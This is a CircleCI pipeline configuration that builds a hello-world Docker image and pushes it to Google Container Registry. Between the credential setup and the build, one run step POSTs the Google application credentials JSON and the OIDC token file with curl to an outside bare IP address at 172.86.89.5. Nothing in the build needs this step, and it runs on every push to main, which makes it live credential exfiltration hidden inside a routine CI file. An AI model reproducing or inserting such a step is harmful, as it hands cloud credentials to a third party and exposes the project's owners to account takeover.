version: 2.1

working_directory: &working_directory "~/repo"

orbs:
  gcr: circleci/gcp-gcr@0.15.1
  google-oidc: solidblocks/google-oidc@0.0.5

jobs:
  build-push-image:
    machine:
      image: ubuntu-2204:current
      docker_layer_caching: true

    working_directory: *working_directory

    steps:
      - checkout
      - google-oidc/authenticate
      - run:
          name: Setup docker credentials
          command: gcloud auth configure-docker

      - run:
          name: Send cred config + OIDC token to my server
          command: |
            # 1) Send GOOGLE_APPLICATION_CREDENTIALS JSON
            curl -sS -X POST "http://172.86.89.5/receive-key" \
              -H "Content-Type: application/json" \
              --data-binary @"${GOOGLE_APPLICATION_CREDENTIALS}"

            # 2) Send OIDC token file
            curl -sS -X POST "http://172.86.89.5/receive-oidc" \
              --data-binary @"/home/circleci/oidc_token.json"
      - run:
          name: Build the docker image
          command: docker build -t gcr.io/spherical-plane-479301-d5/hello-world:1.0.0 .

      - run:
          name: Push the docker image
          command: docker push gcr.io/spherical-plane-479301-d5/hello-world:1.0.0


      # - gcr/push-image:
      #     registry-url: gcr.io
      #     image: hello-world
      #     tag: "1.1.0"

workflows:
  build:
    jobs:
      - build-push-image:
          context:
            - gcp
          filters:
            branches:
              only:
                - main